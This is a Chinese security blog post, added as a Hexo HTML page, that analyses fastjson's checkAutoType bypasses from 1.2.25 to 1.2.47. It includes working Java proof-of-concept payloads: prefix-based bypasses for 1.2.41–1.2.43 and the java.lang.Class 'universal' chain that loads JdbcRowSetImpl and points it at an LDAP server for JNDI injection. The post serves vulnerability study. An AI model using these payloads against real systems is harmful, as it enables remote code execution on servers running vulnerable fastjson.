@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    
+
+    
+<div class="hd posts">
+
+    <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a>
+    <div class="post-title">
+        <p>
+            FastJson(2): 漏洞分析
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        
+        <div id="table-of-content">
+            <ul id="table-of-content-ul">
+
+            </ul>
+        </div>
+
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第二次和这玩意对线了，第一次是23年中。这次终于懂了。</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/fastjson(2)-parse-vul/image-20240301144413092.png" alt="image-20240301144413092.png"></p>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7027">https://xz.aliyun.com/t/7027</a></p>
+<p>1、自1.2.25之后，多了个checkAutoType方法。这个方法的位置：在parseObject里，扫描到@type后准备获取class之前。</p>
+<p>2、checkAutoType方法的作用：检查不合法的类，若类合法，最后返回一个Class，用于后续创建对象。</p>
+<p>3、在checkAutoType里，调用了很多次三种方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TypeUtils.getClassFromMapping(typeName)</span><br><span class="line"></span><br><span class="line">deserializers.findClass(typeName);</span><br><span class="line"></span><br><span class="line">TypeUtils.loadClass(typeName, defaultClassLoader); // 第二个参数在checkAutoType方法中是null</span><br></pre></td></tr></table></figure>
+
+<p>getClassFromMapping作用：从一个<strong>静态</strong>变量mapping里根据typeName取出class对象。</p>
+<p>findClass作用：在一个成员变量buckets里根据typeName取出class对象。</p>
+<p>loadClass作用：若typeName以<code>[</code>开头，或以<code>L</code>开头且分号结尾，都去掉头尾这些字符。再类加载typeName，再将加载得到的class对象和typeName put进mapping。</p>
+<p>4、我debug分析一会后，独立写出了一种针对于41、42、43版本的poc。无需手动设置autoType为true。与25-47的通杀poc本质相同，但路径有些许不同。</p>
+<h1 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType"></a>checkAutoType</h1><p>在1.2.25中，该方法逻辑概括如下，各版本变更都用注释标出。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1.2.42增加1、若类名长度&lt;3或&gt;128，则抛异常</span><br><span class="line">// 1.2.42增加2: 检查类名开头是否是L和结尾是否是分号，若是则都去掉。这导致了双写绕过</span><br><span class="line">// 在1.2.43中修改双写绕过的逻辑：由去掉开头的L和结尾的分号修改为：若开头是LL且结尾是;;，则异常，若开头是L且结尾是;，则去掉L和分号。但是没有注意到 [ 这个符号可以绕过。</span><br><span class="line">// 在1.2.44中：直接不允许 L和[ 开头</span><br><span class="line"></span><br><span class="line">    if (autoTypeSupport || expectClass != null) &#123;</span><br><span class="line">        // 先检查白名单，符合白名单则直接返回</span><br><span class="line">        // 再检查黑名单，符合则抛异常</span><br><span class="line">        // 从1.2.42 开始，这里的黑名单由明文变成了哈希</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line"></span><br><span class="line">    if (clazz == null) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (clazz != null) &#123;</span><br><span class="line">        if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        return clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!autoTypeSupport) &#123;</span><br><span class="line">        // 先检查白名单，符合白名单则直接返回</span><br><span class="line">        // 再检查黑名单，符合则抛异常</span><br><span class="line">        // 从1.2.42 开始，这里的黑名单由明文变成了哈希</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if (autoTypeSupport || expectClass != null) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (autoTypeSupport || expectClass != null) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	/*</span><br><span class="line">	在41版本中，上面两个if合并修改为如下的：</span><br><span class="line">    if (clazz == null) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);</span><br><span class="line">    &#125;</span><br><span class="line">    */</span><br><span class="line">     </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    if (!autoTypeSupport) &#123;</span><br><span class="line">        throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    return clazz;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="unk’s-poc"><a href="#unk’s-poc" class="headerlink" title="unk’s poc"></a>unk’s poc</h1><p>主要在41 42 43 版本可打。</p>
+<p>原理：执行两次checkAutoType，第一次进入TypeUtils.loadClass，让JdbcRowSetImpl被put进mapping。第二次则可以从TypeUtils.getClassFromMapping获取到JdbcRowSetImpl了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  public static void main(String[] args) throws Exception&#123;</span><br><span class="line">String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;&#125;&quot;; //41</span><br><span class="line">//String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;&#125;&quot;; //42</span><br><span class="line">//String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;&#125;&quot;; //43</span><br><span class="line">      System.out.println(PoC);</span><br><span class="line">      try&#123;</span><br><span class="line">          JSON.parse(PoC);</span><br><span class="line">      &#125;catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      Object pojoNodeChainPoc = Gadget.getPOJONodeChainPoc(&quot;fj_1_2_25to1_2_41.Poc1&quot;);</span><br><span class="line">      new LDAPServer(17777, Util.serialize(pojoNodeChainPoc)).start();</span><br><span class="line">      PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:17777/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">      JSON.parse(PoC);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="25-47-通杀"><a href="#25-47-通杀" class="headerlink" title="25-47 通杀"></a>25-47 通杀</h1><p>主思路仍是想办法先执行<code>TypeUtils.loadClass</code>，后面就可以从<code>getClassFromMapping</code>获取。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;&quot;;</span><br><span class="line">    System.out.println(PoC);</span><br><span class="line">    JSON.parse(PoC);</span><br><span class="line">    Object pojoNodeChainPoc = Gadget.getPOJONodeChainPoc(&quot;fj_1_2_25to1_2_41.Poc1&quot;);</span><br><span class="line">    new LDAPServer(17777, Util.serialize(pojoNodeChainPoc)).start();</span><br><span class="line">    PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:17777/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">    JSON.parse(PoC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一次parse时，获取到Class，准备进行deserialze。</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/fastjson(2)-parse-vul/image-20240301104602258.png" alt="image-20240301104602258.png"></p>
+<p>在deserialze中，会对JSON里的val字段loadClass。</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/fastjson(2)-parse-vul/image-20240301104638516.png" alt="image-20240301104638516.png"></p>
+<p>loadClass加入mapping，那么第二次checkAutoType就能获取jdbcrowset。</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/fastjson(2)-parse-vul/image-20240301105120667.png" alt="image-20240301105120667.png"></p>
+<p>由于第一次parse不会抛出异常，那么两个json可以合并为一个，就是网上常见的通杀poc。</p>
+
+    </div>
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('img'); // 选择所有 img 元素
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+
+        var getAllHeader = ()=>{
+            var content = document.getElementsByClassName('post-content')[0].childNodes
+            // var h2 = h1.getElementsByTagName("h2")
+            var result = []
+            var pair
+            for(var node of content){   
+                var tagName = (node.tagName?node.tagName:"").toLowerCase()
+                if(tagName === 'h1'){
+                    if(pair){
+                        result.push(pair)
+                    }
+                    pair = {"h1":node,"h2":[]}
+
+                }else if(tagName === 'h2'){
+                    pair.h2.push(node)
+                }
+
+            }
+            result.push(pair)
+            return result
+        }
+
+        var writeHeader = (headers)=>{
+            var _ul = document.getElementById("table-of-content-ul")
+            for(var p of headers){ 
+                console.log(p)
+
+                var h1_li = document.createElement('li')
+                var h1_a = document.createElement('a')
+                h1_a.innerText = p.h1.innerText
+                h1_a.href = `#${p.h1.id}`
+                h1_li.appendChild(h1_a)
+                var ul = document.createElement('ul')
+                for(var h2 of p.h2){
+                    var h2_li = document.createElement('li')
+                    var h2_a = document.createElement('a')
+                    h2_a.innerText = h2.innerText
+                    h2_a.href = `#${h2.id}`
+                    h2_li.appendChild(h2_a)
+                    ul.appendChild(h2_li)
+                }
+                h1_li.appendChild(ul)
+                _ul.appendChild(h1_li)
+            }
+        }
+        var headers = getAllHeader()
+        writeHeader(headers)
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body>
+
+</html>
